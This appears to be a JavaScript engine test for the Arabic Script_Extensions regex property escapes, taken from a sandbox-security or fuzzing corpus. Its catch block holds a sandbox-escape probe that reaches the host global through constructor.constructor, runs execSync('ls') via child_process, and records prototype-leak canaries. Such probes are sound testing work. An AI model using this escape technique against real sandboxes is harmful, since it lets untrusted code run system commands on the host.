try {
    const matchSymbols = buildString({
        loneCodePoints: [
            126500,
            126503,
            126521,
            126523,
            126530,
            126535,
            126537,
            126539,
            126548,
            126551,
            126553,
            126555,
            126557,
            126559,
            126564,
            126590
        ],
        ranges: [
            [
                1536,
                1540
            ],
            [
                1542,
                1564
            ],
            [
                1566,
                1756
            ],
            [
                1758,
                1791
            ],
            [
                1872,
                1919
            ],
            [
                2208,
                2228
            ],
            [
                2230,
                2247
            ],
            [
                2259,
                2273
            ],
            [
                2275,
                2303
            ],
            [
                64336,
                64449
            ],
            [
                64467,
                64829
            ],
            [
                64848,
                64911
            ],
            [
                64914,
                64967
            ],
            [
                65008,
                65021
            ],
            [
                65136,
                65140
            ],
            [
                65142,
                65276
            ],
            [
                66272,
                66299
            ],
            [
                69216,
                69246
            ],
            [
                126464,
                126467
            ],
            [
                126469,
                126495
            ],
            [
                126497,
                126498
            ],
            [
                126505,
                126514
            ],
            [
                126516,
                126519
            ],
            [
                126541,
                126543
            ],
            [
                126545,
                126546
            ],
            [
                126561,
                126562
            ],
            [
                126567,
                126570
            ],
            [
                126572,
                126578
            ],
            [
                126580,
                126583
            ],
            [
                126585,
                126588
            ],
            [
                126592,
                126601
            ],
            [
                126603,
                126619
            ],
            [
                126625,
                126627
            ],
            [
                126629,
                126633
            ],
            [
                126635,
                126651
            ],
            [
                126704,
                126705
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Arabic}+$/u, matchSymbols, '\\p{Script_Extensions=Arabic}');
    testPropertyEscapes(/^\p{Script_Extensions=Arab}+$/u, matchSymbols, '\\p{Script_Extensions=Arab}');
    testPropertyEscapes(/^\p{scx=Arabic}+$/u, matchSymbols, '\\p{scx=Arabic}');
    testPropertyEscapes(/^\p{scx=Arab}+$/u, matchSymbols, '\\p{scx=Arab}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            1541,
            1565,
            1757,
            2229,
            2274,
            65141,
            126468,
            126496,
            126499,
            126504,
            126515,
            126520,
            126522,
            126536,
            126538,
            126540,
            126544,
            126547,
            126552,
            126554,
            126556,
            126558,
            126560,
            126563,
            126571,
            126579,
            126584,
            126589,
            126591,
            126602,
            126628,
            126634
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                1535
            ],
            [
                1792,
                1871
            ],
            [
                1920,
                2207
            ],
            [
                2248,
                2258
            ],
            [
                2304,
                56319
            ],
            [
                57344,
                64335
            ],
            [
                64450,
                64466
            ],
            [
                64830,
                64847
            ],
            [
                64912,
                64913
            ],
            [
                64968,
                65007
            ],
            [
                65022,
                65135
            ],
            [
                65277,
                66271
            ],
            [
                66300,
                69215
            ],
            [
                69247,
                126463
            ],
            [
                126501,
                126502
            ],
            [
                126524,
                126529
            ],
            [
                126531,
                126534
            ],
            [
                126549,
                126550
            ],
            [
                126565,
                126566
            ],
            [
                126620,
                126624
            ],
            [
                126652,
                126703
            ],
            [
                126706,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Arabic}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Arabic}');
    testPropertyEscapes(/^\P{Script_Extensions=Arab}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Arab}');
    testPropertyEscapes(/^\P{scx=Arabic}+$/u, nonMatchSymbols, '\\P{scx=Arabic}');
    testPropertyEscapes(/^\P{scx=Arab}+$/u, nonMatchSymbols, '\\P{scx=Arab}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}